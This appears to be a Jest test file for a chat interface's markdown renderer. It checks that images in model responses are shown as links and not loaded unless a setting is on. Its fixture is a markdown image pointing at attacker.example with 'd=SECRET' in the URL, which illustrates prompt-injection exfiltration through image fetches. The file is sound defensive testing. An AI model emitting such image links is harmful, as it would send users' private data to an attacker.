import React from "react";
import { render, screen } from "@testing-library/react";
import "@testing-library/jest-dom";
import ReactMarkdown from "react-markdown";
import MarkdownMessage from "./MarkdownMessage";
import { componentsFor } from "../chat-v2/MarkdownText";

// 2u2: a chat renders images in responses only when its "Render images in
// responses" setting is on. Off (the default), model output shaped by a
// prompt injection cannot make the user's browser fetch anything.
const injected = "Here you go ![chart](https://attacker.example/c?d=SECRET) done.";

describe("chat v1 (MarkdownMessage)", () => {
  it("shows an image as a link and never loads it by default", () => {
    const { container } = render(<MarkdownMessage content={injected} />);
    // eslint-disable-next-line testing-library/no-node-access, testing-library/no-container
    expect(container.querySelectorAll("img")).toHaveLength(0);
    const blocked = screen.getByTestId("blocked-image");
    expect(blocked).toHaveTextContent("image: chart (attacker.example, not loaded)");
    expect(blocked).toHaveAttribute("href", "https://attacker.example/c?d=SECRET");
    expect(blocked).toHaveAttribute("rel", "noopener noreferrer nofollow");
  });

  it("does not load an image with the setting off", () => {
    const { container } = render(<MarkdownMessage content={injected} renderImages={false} />);
    // eslint-disable-next-line testing-library/no-node-access, testing-library/no-container
    expect(container.querySelectorAll("img")).toHaveLength(0);
  });

  it("renders the image with the setting on", () => {
    render(<MarkdownMessage content={injected} renderImages />);
    expect(screen.getByRole("img", { name: "chart" })).toHaveAttribute("src", "https://attacker.example/c?d=SECRET");
    expect(screen.queryByTestId("blocked-image")).toBeNull();
  });
});

describe("chat v2 (MarkdownText components)", () => {
  // MarkdownText hands these components to assistant-ui's react-markdown.
  const renderV2 = (on) => render(<ReactMarkdown components={componentsFor(on)}>{injected}</ReactMarkdown>);

  it("shows an image as a link that is never loaded when the setting is off", () => {
    const { container } = renderV2(false);
    // eslint-disable-next-line testing-library/no-node-access, testing-library/no-container
    expect(container.querySelectorAll("img")).toHaveLength(0);
    expect(screen.getByTestId("blocked-image")).toHaveTextContent("image: chart (attacker.example, not loaded)");
  });

  it("renders the image when the setting is on", () => {
    renderV2(true);
    expect(screen.getByRole("img", { name: "chart" })).toHaveAttribute("src", "https://attacker.example/c?d=SECRET");
    expect(screen.queryByTestId("blocked-image")).toBeNull();
  });
});
